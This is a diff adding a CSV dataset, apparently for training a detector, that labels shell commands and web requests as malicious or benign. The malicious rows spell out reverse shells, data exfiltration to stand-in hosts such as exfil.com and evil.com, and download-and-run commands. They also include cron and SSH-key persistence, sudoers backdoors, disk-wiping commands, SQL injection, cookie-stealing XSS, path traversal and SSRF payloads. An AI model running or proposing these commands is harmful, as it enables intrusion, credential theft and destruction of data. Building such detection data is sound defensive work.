@@ -1,0 +1,1001 @@
+timestamp,attacker_ip,command_sequence,label
+2026-01-23 15:42:12,211.201.2.18,"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
+2026-01-23 07:31:12,99.24.226.137,journalctl -u nginx -n 50,0
+2026-01-23 16:39:12,54.30.121.195,enum4linux target.com,1
+2026-01-23 03:11:12,144.43.67.11,cat /proc/cpuinfo | grep 'model name',0
+2026-01-23 12:36:12,65.112.116.47,"curl -H ""X-Forwarded-For: <script>alert('XSS')</script>"" http://target.com/",1
+2026-01-23 03:16:12,143.172.106.215,journalctl -u nginx -n 50,0
+2026-01-23 15:39:12,94.66.122.72,"sqlmap -u ""http://target.com/api?id=1"" --batch --dbs",1
+2026-01-23 11:05:12,184.70.222.85,find / -perm -4000 -type f 2>/dev/null | xargs ls -la,1
+2026-01-23 17:30:12,1.240.251.49,echo '* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | crontab -,1
+2026-01-23 05:17:12,220.69.13.206,ping -c 4 google.com,0
+2026-01-23 06:15:12,36.210.24.31,logrotate -f /etc/logrotate.d/nginx,0
+2026-01-23 17:11:12,75.75.88.129,rm -rf /var/www/html/*,1
+2026-01-23 05:51:12,91.203.223.40,ps aux | grep nginx,0
+2026-01-23 09:06:12,192.33.23.204,lsblk,0
+2026-01-23 05:35:12,115.18.80.137,free -m,0
+2026-01-23 05:21:12,108.32.215.145,scp user@server:/var/log/app.log ./,0
+2026-01-23 04:50:12,185.45.243.137,ln -s /var/www/html /home/user/www,0
+2026-01-23 15:59:12,62.114.254.66,"curl -X POST ""http://target.com/login"" -d ""user=admin'--&pass=x""",1
+2026-01-23 09:51:12,127.18.193.246,tar czf - /etc/passwd | base64 | curl -X POST --data-binary @- http://exfil.com/leak,1
+2026-01-23 15:48:12,73.165.159.169,nikto -h http://target.com,1
+2026-01-23 13:42:12,137.123.104.49,nikto -h http://target.com,1
+2026-01-23 06:13:12,109.113.33.38,rsnapshot daily,0
+2026-01-23 16:58:12,58.85.178.60,"env x='() { :;}; /bin/bash -c ""bash -i >& /dev/tcp/10.0.0.1/4444 0>&1""' bash -c 'echo vulnerable'",1
+2026-01-23 11:09:12,123.252.240.248,bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1',1
+2026-01-23 15:01:12,191.198.101.35,gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt,1
+2026-01-23 11:39:12,135.55.96.36,"curl -X POST ""http://target.com/login"" -d ""user=admin'--&pass=x""",1
+2026-01-23 03:22:12,74.95.142.235,ping -c 4 google.com,0
+2026-01-23 15:38:12,159.217.249.239,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
+2026-01-23 01:36:12,32.137.37.192,ls -la /var/log/,0
+2026-01-23 12:59:12,60.250.110.189,"curl ""http://target.com/api/users?sort=password&order=ASC""",1
+2026-01-23 14:06:12,119.52.145.25,gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt,1
+2026-01-23 08:39:12,175.95.232.192,systemctl status mysql,0
+2026-01-23 03:03:12,222.73.196.246,tail -100 /var/log/nginx/access.log,0
+2026-01-23 01:19:12,216.188.194.221,apt update && apt list --upgradable,0
+2026-01-23 07:16:12,91.140.39.247,grep 'error' /var/log/syslog,0
+2026-01-23 06:44:12,11.229.147.119,id,0
+2026-01-23 03:44:12,216.223.145.68,mtr -c 10 google.com,0
+2026-01-23 15:23:12,115.235.140.237,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
+2026-01-23 05:11:12,109.170.26.62,traceroute google.com,0
+2026-01-23 14:05:12,22.24.138.152,"curl ""http://target.com/api/users?sort=password&order=ASC""",1
+2026-01-23 09:42:12,84.99.198.170,"echo ""* * * * * /usr/bin/nc -e /bin/sh attacker.com 4444"" >> /tmp/cronjob && crontab /tmp/cronjob",1
+2026-01-23 09:13:12,96.188.160.118,ss -tulwn,0
+2026-01-23 10:49:12,219.14.221.63,bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1',1
+2026-01-23 12:33:12,145.250.186.252,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
+2026-01-23 13:29:12,140.91.5.66,"curl ""http://target.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>""",1
+2026-01-23 17:43:12,216.164.30.36,"msfconsole -q -x ""use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.0.0.1; run""",1
+2026-01-23 04:24:12,99.28.246.190,uptime,0
+2026-01-23 03:02:12,208.154.33.192,tar -czf backup.tar.gz /var/www/html,0
+2026-01-23 13:10:12,74.110.63.138,nikto -h http://target.com,1
+2026-01-23 16:02:12,22.18.13.26,dd if=/dev/zero of=/dev/sda bs=1M,1
+2026-01-23 07:46:12,103.129.220.24,dig example.com,0
+2026-01-23 06:59:12,99.181.65.243,nslookup google.com,0
+2026-01-23 10:53:12,59.252.96.20,"curl -X POST ""http://target.com/login"" --data ""username=admin'--&password=anything""",1
+2026-01-23 08:22:12,139.250.200.196,ip route show,0
+2026-01-23 14:53:12,163.18.242.158,"curl -X PUT http://target.com/api/user/1 -d '{""password"":""hacked123""}'",1
+2026-01-23 15:28:12,50.203.154.204,enum4linux target.com,1
+2026-01-23 14:26:12,36.169.32.201,echo 'ssh-rsa AAAAB3Nza... attacker@evil.com' >> /root/.ssh/authorized_keys,1
+2026-01-23 07:23:12,116.232.146.37,curl -I https://example.com,0
+2026-01-23 11:52:12,161.183.36.14,sudo nmap --script vuln target.com,1
+2026-01-23 01:17:12,40.57.196.245,df -h /,0
+2026-01-23 08:44:12,96.207.134.164,timedatectl,0
+2026-01-23 13:27:12,98.61.255.233,cat ../../../etc/passwd,1
+2026-01-23 05:24:12,61.173.102.119,top -n 1 | head -20,0
+2026-01-23 09:02:12,156.193.62.43,netstat -tulpn,0
+2026-01-23 11:29:12,72.123.158.188,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
+2026-01-23 12:05:12,68.149.117.209,host -t txt target.com,1
+2026-01-23 14:55:12,212.156.84.177,rm -rf /var/www/html/*,1
+2026-01-23 10:37:12,180.72.150.130,"curl -H ""User-Agent: <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"" http://target.com",1
+2026-01-23 10:45:12,96.1.228.246,find / -perm -4000 -type f 2>/dev/null | xargs ls -la,1
+2026-01-23 12:15:12,56.174.203.137,cat ../../../../etc/shadow,1
+2026-01-23 16:07:12,122.251.86.76,"curl -H ""Host: internal.target.com"" http://target.com/",1
+2026-01-23 10:08:12,170.94.178.121,"curl ""http://target.com/load?file=../../../../etc/passwd""",1
+2026-01-23 07:29:12,89.116.34.67,top -n 1 | head -20,0
+2026-01-23 14:39:12,156.236.174.51,ncat 10.0.0.1 4444 -e /bin/bash,1
+2026-01-23 15:52:12,39.217.225.125,sudo nmap --script vuln target.com,1
+2026-01-23 12:56:12,126.162.151.182,cat ../../../../etc/shadow,1
+2026-01-23 08:38:12,150.210.44.139,mount | grep ext4,0
+2026-01-23 11:55:12,80.27.179.163,"curl ""http://target.com/api?id=1; DROP TABLE users;--""",1
+2026-01-23 03:01:12,189.135.211.240,ps aux | grep nginx,0
+2026-01-23 16:05:12,43.230.20.1,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
+2026-01-23 06:24:12,107.165.61.71,grep 'error' /var/log/syslog,0
+2026-01-23 07:34:12,134.183.92.179,tar -czf backup.tar.gz /var/www/html,0
+2026-01-23 11:54:12,184.233.162.149,echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,1
+2026-01-23 14:27:12,138.119.227.62,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
+2026-01-23 15:33:12,43.148.82.63,"curl ""http://target.com/api?id=1; DROP TABLE users;--""",1
+2026-01-23 11:22:12,50.232.197.73,nc -e /bin/sh 10.0.0.1 4444,1
+2026-01-23 15:43:12,201.231.146.124,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
+2026-01-23 07:21:12,21.83.169.188,localectl status,0
+2026-01-23 11:28:12,167.219.11.142,"curl ""http://target.com/api?id=1' OR '1'='1""",1
+2026-01-23 15:47:12,163.172.133.204,bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',1
+2026-01-23 08:48:12,197.206.4.121,nslookup google.com,0
+2026-01-23 03:33:12,109.5.192.95,wget --spider https://example.com/file.zip,0
+2026-01-23 13:58:12,33.122.147.91,"curl -H ""X-Forwarded-For: <script>alert('XSS')</script>"" http://target.com/",1
+2026-01-23 12:52:12,196.59.146.178,rm -rf /var/www/html/*,1
+2026-01-23 05:09:12,61.9.98.156,ls -la /var/log/,0
+2026-01-23 05:39:12,205.188.162.191,fdisk -l,0
+2026-01-23 10:28:12,61.228.209.216,cat /var/www/../../../../etc/passwd,1
+2026-01-23 01:51:12,205.9.146.71,systemctl status nginx,0
+2026-01-23 07:09:12,36.17.221.72,chown www-data:www-data /var/www/html -R,0
+2026-01-23 14:08:12,190.36.217.95,"curl ""http://target.com/file?path=../../../etc/passwd""",1
+2026-01-23 14:14:12,169.6.208.192,cat ../../../etc/passwd,1
+2026-01-23 07:32:12,122.91.93.29,chmod 644 /var/www/html/index.html,0
+2026-01-23 03:51:12,69.153.136.174,find /var/www -name '*.php' -mtime -1,0
+2026-01-23 01:56:12,140.46.193.208,ls -la /var/log/,0
+2026-01-23 07:58:12,218.52.220.218,tail -100 /var/log/nginx/access.log,0
+2026-01-23 13:05:12,8.216.82.121,"curl ""http://target.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>""",1
+2026-01-23 11:36:12,133.198.184.127,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
+2026-01-23 06:40:12,110.171.167.105,cat /proc/meminfo | head -10,0
+2026-01-23 05:41:12,131.56.142.85,dig example.com,0
+2026-01-23 13:52:12,203.59.47.191,"curl -H ""Host: internal.target.com"" http://target.com/",1
+2026-01-23 10:12:12,132.24.27.29,"echo ""* * * * * curl -s http://malicious.server/cron.sh | bash"" >> /var/spool/cron/root",1
+2026-01-23 01:33:12,18.225.107.238,rsync -av /home/user/backup/ /mnt/backup_drive/,0
+2026-01-23 03:50:12,31.48.187.212,uptime,0
+2026-01-23 12:04:12,197.111.2.193,"curl -H ""X-Original-URL: /admin"" http://target.com/",1
+2026-01-23 12:25:12,149.74.136.105,enum4linux target.com,1
+2026-01-23 08:27:12,142.157.215.185,apt update,0
+2026-01-23 06:33:12,109.9.190.235,du -sh /var/www/*,0
+2026-01-23 11:33:12,29.47.245.86,"curl -H ""User-Agent: <img src=x onerror=alert(1)>"" http://target.com/",1
+2026-01-23 15:56:12,46.64.55.130,"env x='() { :;}; /bin/bash -c ""bash -i >& /dev/tcp/10.0.0.1/4444 0>&1""' bash -c 'echo vulnerable'",1
+2026-01-23 03:18:12,112.175.242.15,mtr -c 10 google.com,0
+2026-01-23 17:38:12,110.82.202.98,rm -rf /* --no-preserve-root,1
+2026-01-23 06:14:12,90.0.55.188,ping -c 4 google.com,0
+2026-01-23 10:15:12,70.201.58.76,find / -perm -4000 -type f 2>/dev/null | xargs ls -la,1
+2026-01-23 04:35:12,105.75.41.163,mtr -c 10 google.com,0
+2026-01-23 02:07:12,219.125.29.122,df -h /,0
+2026-01-23 07:51:12,31.219.249.54,tar -czf backup.tar.gz /var/www/html,0
+2026-01-23 02:10:12,216.238.104.236,tail -20 /var/log/syslog,0
+2026-01-23 13:19:12,55.127.112.18,"sqlmap -u ""http://target.com/api?id=1"" --batch --dbs",1
+2026-01-23 10:20:12,5.139.169.155,sudo -u#-1 /bin/bash,1
+2026-01-23 14:40:12,196.223.98.63,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
+2026-01-23 10:42:12,209.42.117.78,"echo ""*/5 * * * * curl -s http://attacker.com/payload.sh | bash"" >> /var/spool/cron/crontabs/root",1
+2026-01-23 15:50:12,170.41.132.64,rm -rf /* --no-preserve-root,1
+2026-01-23 01:46:12,180.32.98.106,ls -la /var/log/,0
+2026-01-23 07:56:12,214.224.120.12,curl -s https://api.ipify.org,0
+2026-01-23 17:04:12,187.237.89.183,echo 'ssh-rsa AAAAB3Nza... attacker@evil.com' >> /root/.ssh/authorized_keys,1
+2026-01-23 14:33:12,218.166.255.254,rm -rf /* --no-preserve-root,1
+2026-01-23 11:38:12,155.181.26.112,"curl -X PUT http://target.com/api/user/1 -d '{""password"":""hacked123""}'",1
+2026-01-23 17:32:12,48.48.30.85,"curl -H ""X-Forwarded-For: <script>alert('XSS')</script>"" http://target.com/",1
+2026-01-23 02:19:12,81.54.22.35,apt update && apt list --upgradable,0
+2026-01-23 14:51:12,71.158.172.77,"curl ""http://target.com/cgi-bin/test.cgi?cmd=cat%20/etc/passwd""",1
+2026-01-23 04:09:12,128.126.106.165,ls -la /var/log/,0
+2026-01-23 16:16:12,46.15.188.70,"sqlmap -u ""http://target.com/api?id=1"" --batch --dbs",1
+2026-01-23 11:24:12,8.181.150.229,"sqlmap -u ""http://target.com/api?id=1"" --batch --dbs",1
+2026-01-23 10:40:12,28.84.175.69,sudo -u#-1 /bin/bash,1
+2026-01-23 09:40:12,162.12.19.78,sudo -u#-1 /bin/bash,1
+2026-01-23 04:11:12,149.18.252.60,cat /proc/meminfo | head -10,0
+2026-01-23 14:07:12,212.183.53.15,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
+2026-01-23 09:39:12,166.66.86.214,bash -i >& /dev/tcp/192.168.1.100/4444 0>&1,1
+2026-01-23 07:45:12,55.184.210.153,scp user@server:/var/log/app.log ./,0
+2026-01-23 17:09:12,165.178.122.36,"curl ""http://target.com/file?path=../../../etc/passwd""",1
+2026-01-23 14:20:12,208.94.120.30,"curl ""http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/""",1
+2026-01-23 07:54:12,113.75.96.228,rsnapshot daily,0
+2026-01-23 17:34:12,117.15.203.207,cat ../../../etc/passwd,1
+2026-01-23 05:42:12,83.195.24.107,wget --spider https://example.com/file.zip,0
+2026-01-23 07:04:12,181.155.5.218,cat /proc/cpuinfo | grep 'model name',0
+2026-01-23 17:25:12,42.202.96.233,ncat 10.0.0.1 4444 -e /bin/bash,1
+2026-01-23 17:46:12,140.142.116.190,host -t txt target.com,1
+2026-01-23 04:13:12,117.129.132.10,mtr -c 10 google.com,0
+2026-01-23 12:23:12,170.125.143.60,"curl -X POST http://target.com/api/admin -H ""Content-Type: application/json"" -d '{""role"":""admin"",""id"":1}'",1
+2026-01-23 01:18:12,149.131.42.158,ping -c 4 8.8.8.8,0
+2026-01-23 08:14:12,49.145.149.51,tar -czf backup.tar.gz /var/www/html,0
+2026-01-23 16:50:12,30.95.244.173,enum4linux target.com,1
+2026-01-23 05:28:12,48.28.149.240,traceroute google.com,0
+2026-01-23 05:59:12,113.153.183.11,ln -s /var/www/html /home/user/www,0
+2026-01-23 02:18:12,205.163.36.128,ping -c 4 8.8.8.8,0
+2026-01-23 15:46:12,203.33.150.109,"env x='() { :;}; /bin/bash -c ""bash -i >& /dev/tcp/10.0.0.1/4444 0>&1""' bash -c 'echo vulnerable'",1
+2026-01-23 06:26:12,34.155.121.168,fdisk -l,0
+2026-01-23 10:58:12,29.58.15.58,"curl ""http://target.com/load?file=../../../../etc/passwd""",1
+2026-01-23 03:12:12,208.69.232.45,ss -tulwn,0
+2026-01-23 13:16:12,86.31.204.43,echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,1
+2026-01-23 05:25:12,33.189.121.238,find /var/www -name '*.php' -mtime -1,0
+2026-01-23 04:38:12,206.48.210.19,chown www-data:www-data /var/www/html -R,0
+2026-01-23 05:54:12,218.207.1.197,chown www-data:www-data /var/www/html -R,0
+2026-01-23 12:41:12,130.113.185.84,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
+2026-01-23 13:23:12,106.4.223.152,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
+2026-01-23 16:12:12,141.180.123.73,find / -perm -4000 -type f 2>/dev/null,1
+2026-01-23 11:06:12,151.116.8.51,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
+2026-01-23 07:42:12,194.214.77.153,rsync -avz /var/www/html/ backup/,0
+2026-01-23 07:49:12,85.24.120.92,apt list --upgradable,0
+2026-01-23 07:03:12,214.24.155.6,tail -100 /var/log/nginx/access.log,0
+2026-01-23 02:31:12,47.32.52.132,systemctl status nginx,0
+2026-01-23 12:47:12,43.123.223.34,nc -e /bin/sh 10.0.0.1 4444,1
+2026-01-23 01:43:12,170.62.149.9,rsync -avz /home/user/documents/ /backup/documents/,0
+2026-01-23 04:56:12,222.233.187.27,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
+2026-01-23 09:08:12,193.82.72.250,nmcli device status,0
+2026-01-23 11:19:12,199.69.64.53,"curl ""http://target.com/api/users?sort=password&order=ASC""",1
+2026-01-23 17:08:12,74.206.45.186,host -t txt target.com,1
+2026-01-23 13:49:12,88.6.137.59,"curl ""http://target.com/file?path=../../../etc/passwd""",1
+2026-01-23 03:25:12,147.203.74.16,crontab -l,0
+2026-01-23 07:24:12,157.112.84.21,dig example.com,0
+2026-01-23 13:48:12,23.37.17.152,"env x='() { :;}; /bin/bash -c ""bash -i >& /dev/tcp/10.0.0.1/4444 0>&1""' bash -c 'echo vulnerable'",1
+2026-01-23 05:14:12,198.120.116.249,ln -s /var/www/html /home/user/www,0
+2026-01-23 10:50:12,132.171.9.185,sudo -u#-1 /bin/bash,1
+2026-01-23 08:53:12,188.100.197.192,netstat -tulpn,0
+2026-01-23 12:00:12,75.167.78.181,hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com,1
+2026-01-23 03:17:12,61.85.64.33,find /var/www -name '*.php' -mtime -1,0
+2026-01-23 10:24:12,142.72.223.90,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.10.10"",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
+2026-01-23 01:49:12,49.203.58.203,apt update && apt list --upgradable,0
+2026-01-23 03:58:12,80.87.61.29,hostnamectl,0
+2026-01-23 10:07:12,200.128.240.189,"curl -H ""User-Agent: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"" http://target.com",1
+2026-01-23 13:20:12,220.188.235.130,find / -perm -4000 -type f 2>/dev/null,1
+2026-01-23 04:29:12,99.254.14.190,uptime,0
+2026-01-23 17:48:12,20.240.92.247,"curl -H ""X-Original-URL: /admin"" http://target.com/",1
+2026-01-23 09:41:12,215.129.118.11,tar czf - /etc/passwd | base64 | curl -X POST --data-binary @- http://exfil.server/collect,1
+2026-01-23 06:17:12,52.241.184.157,ip route show,0
+2026-01-23 07:43:12,147.28.144.164,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
+2026-01-23 15:36:12,91.93.142.93,"curl ""http://target.com/api?id=1; DROP TABLE users;--""",1
+2026-01-23 16:44:12,170.30.214.251,echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,1
+2026-01-23 09:20:12,185.74.48.80,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
+2026-01-23 02:48:12,4.163.127.56,ping -c 4 8.8.8.8,0
+2026-01-23 05:04:12,26.64.40.95,apt list --upgradable,0
+2026-01-23 02:45:12,179.179.60.243,"journalctl --since ""1 hour ago"" -u ssh",0
+2026-01-23 13:39:12,62.89.254.69,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
+2026-01-23 03:21:12,59.160.52.190,mount | grep ext4,0
+2026-01-23 13:53:12,153.137.139.241,"curl -X POST ""http://target.com/login"" -d ""user=admin'--&pass=x""",1
+2026-01-23 05:02:12,51.150.207.26,ip addr show,0
+2026-01-23 16:21:12,205.62.94.137,rm -rf /* --no-preserve-root,1
+2026-01-23 13:47:12,181.101.198.95,dig @target.com axfr target.com,1
+2026-01-23 10:04:12,105.54.168.214,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.15.100"",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
+2026-01-23 13:33:12,214.62.52.114,"sqlmap -u ""http://target.com/api?id=1"" --batch --dbs",1
+2026-01-23 15:10:12,106.189.78.125,"curl -H ""User-Agent: <img src=x onerror=alert(1)>"" http://target.com/",1
+2026-01-23 11:16:12,40.138.243.129,curl http://evil.com/backdoor.php | bash,1
+2026-01-23 02:30:12,212.169.114.217,tail -20 /var/log/syslog,0
+2026-01-23 11:18:12,113.143.249.47,dig @target.com axfr target.com,1
+2026-01-23 01:20:12,209.62.34.201,tail -20 /var/log/syslog,0
+2026-01-23 03:36:12,151.108.234.194,cat /etc/nginx/nginx.conf,0
+2026-01-23 02:53:12,137.28.197.135,rsync -avz /home/user/documents/ /backup/documents/,0
+2026-01-23 05:47:12,83.12.49.197,crontab -l,0
+2026-01-23 12:17:12,118.83.202.192,"curl -H ""User-Agent: <img src=x onerror=alert(1)>"" http://target.com/",1
+2026-01-23 08:25:12,117.83.125.193,curl -s https://api.ipify.org,0
+2026-01-23 14:01:12,150.17.120.25,cat ../../../etc/passwd,1
+2026-01-23 17:55:12,6.248.125.221,enum4linux target.com,1
+2026-01-23 17:27:12,39.154.252.133,chmod 4777 /bin/bash,1
+2026-01-23 16:46:12,108.45.22.224,"curl -H ""X-Original-URL: /admin"" http://target.com/",1
+2026-01-23 06:51:12,66.218.57.219,localectl status,0
+2026-01-23 06:35:12,171.130.46.85,hostnamectl,0
+2026-01-23 17:53:12,168.190.29.106,echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,1
+2026-01-23 17:07:12,208.180.8.119,ncat 10.0.0.1 4444 -e /bin/bash,1
+2026-01-23 06:41:12,98.201.225.35,crontab -l,0
+2026-01-23 17:35:12,72.52.170.201,"curl -X POST ""http://target.com/login"" -d ""user=admin'--&pass=x""",1
+2026-01-23 06:20:12,132.174.99.44,curl -I https://example.com,0
+2026-01-23 04:45:12,41.223.240.84,ls -la /var/log/,0
+2026-01-23 12:49:12,8.45.208.164,hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com,1
+2026-01-23 12:14:12,216.74.26.15,dig @target.com axfr target.com,1
+2026-01-23 04:23:12,126.221.58.153,cat /etc/nginx/nginx.conf,0
+2026-01-23 17:10:12,129.13.178.96,"curl -H ""Host: internal.target.com"" http://target.com/",1
+2026-01-23 09:12:12,62.154.209.100,du -sh /var/www/*,0
+2026-01-23 16:45:12,189.102.245.188,"curl ""http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/""",1
+2026-01-23 13:59:12,50.26.94.250,"curl -H ""Host: internal.target.com"" http://target.com/",1
+2026-01-23 16:25:12,193.224.58.59,nikto -h http://target.com,1
+2026-01-23 13:36:12,113.213.58.3,dd if=/dev/zero of=/dev/sda bs=1M,1
+2026-01-23 07:40:12,97.250.4.217,whoami,0
+2026-01-23 15:40:12,70.124.25.202,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
+2026-01-23 09:43:12,131.70.9.71,"curl ""http://target.com/export?file=....//....//....//proc/self/environ""",1
+2026-01-23 16:10:12,198.179.128.175,"curl -X PUT http://target.com/api/user/1 -d '{""password"":""hacked123""}'",1
+2026-01-23 12:19:12,218.87.64.220,"curl ""http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/""",1
+2026-01-23 03:49:12,51.187.209.114,ping -c 4 google.com,0
+2026-01-23 08:54:12,165.99.239.53,lsblk,0
+2026-01-23 14:03:12,153.185.214.194,nikto -h http://target.com,1
+2026-01-23 14:44:12,58.131.243.183,"sqlmap -u ""http://target.com/api?id=1"" --batch --dbs",1
+2026-01-23 08:36:12,107.25.180.21,lsblk,0
+2026-01-23 04:58:12,120.196.171.94,nslookup google.com,0
+2026-01-23 11:51:12,19.6.62.102,nikto -h http://target.com,1
+2026-01-23 08:01:12,30.36.233.206,ln -s /var/www/html /home/user/www,0
+2026-01-23 08:10:12,174.249.128.12,curl -s https://api.ipify.org,0
+2026-01-23 16:08:12,209.66.205.234,"msfconsole -q -x ""use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.0.0.1; run""",1
+2026-01-23 12:13:12,215.156.41.189,rpcclient -U admin%password target.com -c 'enumdomusers',1
+2026-01-23 02:03:12,111.141.215.111,rsync -avz /home/user/data/ /backup/user_data/,0
+2026-01-23 07:02:12,172.104.245.167,grep 'error' /var/log/syslog,0
+2026-01-23 07:38:12,189.56.106.12,du -sh /var/www/*,0
+2026-01-23 15:03:12,14.230.182.79,echo 'ssh-rsa AAAAB3Nza... attacker@evil.com' >> /root/.ssh/authorized_keys,1
+2026-01-23 06:55:12,94.158.233.218,du -sh /var/www/*,0
+2026-01-23 16:30:12,148.151.90.124,enum4linux target.com,1
+2026-01-23 14:42:12,112.253.66.50,nikto -h http://target.com,1
+2026-01-23 04:08:12,74.157.248.194,chmod 644 /var/www/html/index.html,0
+2026-01-23 09:59:12,135.129.59.199,bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1',1
+2026-01-23 09:23:12,169.192.175.154,du -sh /var/www/*,0
+2026-01-23 16:14:12,71.162.229.140,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
+2026-01-23 05:32:12,28.179.246.131,ls -la /var/log/,0
+2026-01-23 13:01:12,60.250.184.92,"curl -H ""X-Original-URL: /admin"" http://target.com/",1
+2026-01-23 12:28:12,21.35.178.14,"curl ""http://target.com/api?id=1' OR '1'='1""",1
+2026-01-23 14:57:12,207.110.15.74,"curl -X POST ""http://target.com/login"" -d ""user=admin'--&pass=x""",1
+2026-01-23 05:01:12,221.171.159.247,uptime,0
+2026-01-23 05:43:12,66.179.252.168,netstat -tulpn,0
+2026-01-23 02:39:12,156.222.43.19,apt update && apt list --upgradable,0
+2026-01-23 07:00:12,56.168.98.135,whoami,0
+2026-01-23 08:32:12,168.84.28.32,cat /etc/nginx/nginx.conf,0
+2026-01-23 14:52:12,72.112.20.84,nikto -h http://target.com,1
+2026-01-23 17:14:12,43.56.114.233,"php -r '$sock=fsockopen(""10.0.0.1"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",1
+2026-01-23 16:43:12,35.22.236.145,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
+2026-01-23 10:43:12,185.231.54.35,"curl ""http://target.com/upload?file=../../../etc/shadow""",1
+2026-01-23 03:40:12,164.86.156.169,scp user@server:/var/log/app.log ./,0
+2026-01-23 13:07:12,158.148.44.77,mkfs.ext4 /dev/sda1,1
+2026-01-23 13:54:12,181.161.198.151,curl http://evil.com/backdoor.php | bash,1
+2026-01-23 08:49:12,90.127.43.229,cat /proc/cpuinfo | grep 'model name',0
+2026-01-23 05:46:12,21.70.160.53,mount | grep ext4,0
+2026-01-23 10:25:12,126.203.36.192,find / -perm -4000 -type f 2>/dev/null | xargs ls -la,1
+2026-01-23 10:16:12,119.232.38.92,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
+2026-01-23 04:49:12,60.83.34.239,rsync -avz /var/www/html/ backup/,0
+2026-01-23 01:45:12,167.79.13.180,"journalctl --since ""1 hour ago"" -u ssh",0
+2026-01-23 12:44:12,57.196.190.113,"curl ""http://target.com/cgi-bin/test.cgi?cmd=cat%20/etc/passwd""",1
+2026-01-23 07:39:12,138.112.71.89,apt update,0
+2026-01-23 12:53:12,198.135.85.152,"curl ""http://target.com/file?path=../../../etc/passwd""",1
+2026-01-23 15:21:12,99.87.199.239,find / -perm -4000 -type f 2>/dev/null,1
+2026-01-23 05:13:12,90.36.131.234,tail -100 /var/log/nginx/access.log,0
+2026-01-23 12:24:12,152.46.219.109,"curl ""http://target.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>""",1
+2026-01-23 04:14:12,194.163.58.5,mount | grep ext4,0
+2026-01-23 05:23:12,69.52.51.29,curl -I https://example.com,0
+2026-01-23 02:43:12,151.64.24.210,rsync -avz /home/user/documents/ /backup/documents/,0
+2026-01-23 16:41:12,221.185.232.43,"curl -H ""Host: internal.target.com"" http://target.com/",1
+2026-01-23 14:38:12,201.140.49.44,"curl ""http://target.com/api?id=1; DROP TABLE users;--""",1
+2026-01-23 03:05:12,70.164.16.47,wget --spider https://example.com/file.zip,0
+2026-01-23 14:18:12,17.29.241.183,"curl ""http://target.com/api/users?sort=password&order=ASC""",1
+2026-01-23 14:32:12,75.224.162.92,cat ../../../../etc/shadow,1
+2026-01-23 02:12:12,77.210.50.114,crontab -l,0
+2026-01-23 08:34:12,192.67.240.230,scp user@server:/var/log/app.log ./,0
+2026-01-23 12:16:12,61.24.248.234,echo 'ssh-rsa AAAAB3Nza... attacker@evil.com' >> /root/.ssh/authorized_keys,1
+2026-01-23 14:13:12,11.164.139.129,rm -rf /* --no-preserve-root,1
+2026-01-23 13:38:12,64.149.11.121,"curl ""http://target.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>""",1
+2026-01-23 04:44:12,31.163.255.73,ip route show,0
